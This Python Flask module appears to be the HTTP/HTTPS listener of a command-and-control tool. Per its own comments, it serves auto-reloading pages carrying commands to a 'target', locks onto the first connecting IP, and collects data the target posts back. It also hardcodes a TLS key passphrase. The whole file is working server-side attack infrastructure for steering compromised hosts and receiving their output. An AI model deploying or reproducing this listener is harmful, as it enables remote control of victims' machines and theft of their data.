import flask
import http.server
import logging
import sqlite3
import requests
import ssl
from flask import Flask, render_template
from flask import request
from OpenSSL import SSL
from flask import request
from flask import abort

from db_controller import DBcontroller

app = flask.Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
#CAREFULL DEBUGGER MAKE THE MAIN MENU BUG
#app.config["DEBUG"] = True
#app.debug = True
ips = []
uniqueID = [None]

@app.route('/<namelistener>', methods=['POST', 'GET'])
#route is dinamicall since the pages are generated dynamically
#see HTTPlistener.py listenerhttp() first line
def home(namelistener):
    #return render_template('basicTemplates.html')
    #GET wil display the asked page if it exist
    if flask.request.method == 'GET':
        ID = int(uniqueID[0])

        DBcontrollerobj = DBcontroller()

        if len(ips) == 0:
            print("\nnew connection "+request.remote_addr+ " on server "+namelistener)
            ips.append(request.remote_addr)

            DBcontrollerobj.APIhomeDBupdate(ips[0], str(request.environ['REMOTE_PORT']), ID)

        elif request.remote_addr != ips[0]:
            # c.execute("SELECT name FROM HTTPsListener WHERE ItemUniqueID=?", (ID))
            # namelis = c.fetchall()
            print(ID)
            currentname = DBcontrollerobj.APIhomeDBcurrentname(ID)

            print(request.remote_addr+" tried to connect on "+ str(currentname))
            abort(404)

        return render_template(namelistener+'.html')

    #the server will post the data given by the target back to me
    elif flask.request.method == 'POST':
        data = api_get_data(flask.request)
        print(data)
        return data


    else:
        print("wrong way if this prints check api.py")

#request have different forms
#this function allows me to make sure the data from the target is returned to me
def api_get_data(request):
    #wether if it is .json or .form
    if not request.json:
        return request.form
    else:
        return request.json



def runApi(x, y, ID):
    #this line make sure the page is realoaded everytime
    #in order to display new comands
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    uniqueID[0] = ID
    #start the server for given host and port
    app.run(host=x,port=y)

def runApiSSL(x, y, z, ID):
    #this line make sure the page is realoaded everytime
    #in order to display new comands
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    z = z[0]
    #separate the cert and the key
    zPathCert = str(z[0])
    zPathKey = str(z[1])
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    #for now enter PEM passphrase here (later make user enter it with input)
    context.load_cert_chain(zPathCert, zPathKey, password='test')
    uniqueID[0] = ID
    #start the server for given host and port and SSL cert
    app.run(host=x,port=y, ssl_context=context)
